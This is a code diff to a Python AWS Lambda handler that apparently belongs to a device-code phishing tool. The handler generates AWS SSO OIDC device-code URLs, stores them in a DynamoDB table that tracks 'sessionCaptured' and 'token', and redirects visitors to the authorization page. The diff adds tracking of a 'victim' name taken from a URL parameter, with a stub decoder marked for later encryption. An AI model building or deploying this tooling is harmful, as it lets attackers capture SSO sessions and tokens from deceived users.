@@ -3,6 +3,7 @@ import json
 import boto3
 import os
 import time
+import base64
 
 from decimal import Decimal
 
@@ -36,7 +37,7 @@ def create_device_code_url(sso_oidc_client, start_url):
         sso_oidc_client, oidc_application, start_url)
     return url, device_code, oidc_application
 
-def save_to_db(url, deviceCode, oidc_application):
+def save_to_db(url, deviceCode, oidc_application, victim=""):
     dynamodb = boto3.resource('dynamodb')
     table = dynamodb.Table('sessionTable')
 
@@ -47,7 +48,8 @@ def save_to_db(url, deviceCode, oidc_application):
         'sessionCaptured': False,
         'oidc_app': oidc_application,
         'token': '',
-        'urlExpires': Decimal(time.time() + 600)
+        'urlExpires': Decimal(time.time() + 600),
+        'victim':victim
     }
 
     table.put_item(
@@ -56,18 +58,31 @@ def save_to_db(url, deviceCode, oidc_application):
 
     return data
 
+# implement some type of symetric algo
+def decode_victim_name(url_paramater):
+    return url_paramater
+
 def main(event, context):
 
     START_URL = os.environ['START_URL']
     REGION = os.environ['REGION']
+
+    victim = ""
+
+    try:
+        victim = decode_victim_name(event['queryStringParameters']['v'])
+    except Exception:
+        pass
+
     sso_oidc_client = boto3.client('sso-oidc', region_name=REGION)
 
     url, device_code, oidc_application = create_device_code_url(sso_oidc_client, START_URL)
 
-    save_to_db(url, device_code, oidc_application)
+    save_to_db(url, device_code, oidc_application, victim)
 
     response = {
         "statusCode": 301,
+        "body":str(decode_victim_name(victim)),
         "headers":{
             "Location": url
         }
